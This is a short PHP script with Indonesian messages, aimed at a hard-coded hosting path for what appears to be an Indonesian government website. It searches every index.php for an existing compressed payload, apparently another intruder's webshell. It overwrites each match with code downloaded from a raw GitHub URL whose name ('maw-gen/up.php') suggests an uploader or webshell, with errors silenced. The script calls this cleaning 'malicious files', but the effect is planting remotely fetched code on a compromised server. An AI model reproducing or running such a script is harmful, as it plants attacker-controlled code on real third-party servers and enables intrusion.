<?php
error_reporting(0);

$searchDir = "/home/jdihmyid/bappeda.jayapurakota.go.id/"; // Hapus spasi di awal
$replacementUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/maw-gen/up.php";
$logFile = "update_report.txt";

function replaceMaliciousFiles($dir, $url, $logFile) {
    if (!is_dir($dir)) {
        echo "[ERROR] Direktori tidak ditemukan: $dir\n";
        return;
    }

    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $logEntries = [];

    foreach ($files as $file) {
        if ($file->isFile() && $file->getFilename() === "index.php") {
            $filePath = $file->getPathname();
            $content = file_get_contents($filePath);

            if (strpos($content, '$payload =') !== false && strpos($content, 'Failed to decompress payload!') !== false) {
                echo "[INFO] Mendeteksi file berbahaya: $filePath\n";
                
                $newContent = file_get_contents($url);
                if ($newContent !== false && !empty($newContent)) {
                    file_put_contents($filePath, $newContent);
                    $logEntries[] = "[UPDATED] $filePath";
                } else {
                    $logEntries[] = "[ERROR] Gagal mengambil konten pengganti untuk $filePath";
                }
            }
        }
    }

    if (!empty($logEntries)) {
        file_put_contents($logFile, implode("\n", $logEntries) . "\n", FILE_APPEND);
    }
}

replaceMaliciousFiles($searchDir, $replacementUrl, $logFile);
?>
